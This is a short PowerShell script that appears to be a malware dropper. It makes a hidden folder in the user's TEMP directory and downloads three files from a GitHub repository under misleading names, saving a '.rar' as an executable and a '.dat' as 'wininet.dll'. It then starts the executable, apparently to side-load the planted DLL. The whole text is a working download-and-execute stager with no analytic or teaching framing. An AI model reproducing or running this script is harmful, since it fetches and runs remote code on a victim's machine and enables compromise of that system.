$d="$env:TEMP\.tmpzZRrDz"
mkdir $d -Force|Out-Null
$s="https://raw.githubusercontent.com/Ac333e2/note/refs/heads/main"
iwr "$s/win.rar" -OutFile "$d\CrashSender1403.exe"
iwr "$s/readme.txt" -OutFile "$d\CrashLog.log"
iwr "$s/test.dat" -OutFile "$d\wininet.dll"
Start-Process "$d\CrashSender1403.exe" -WorkingDirectory $d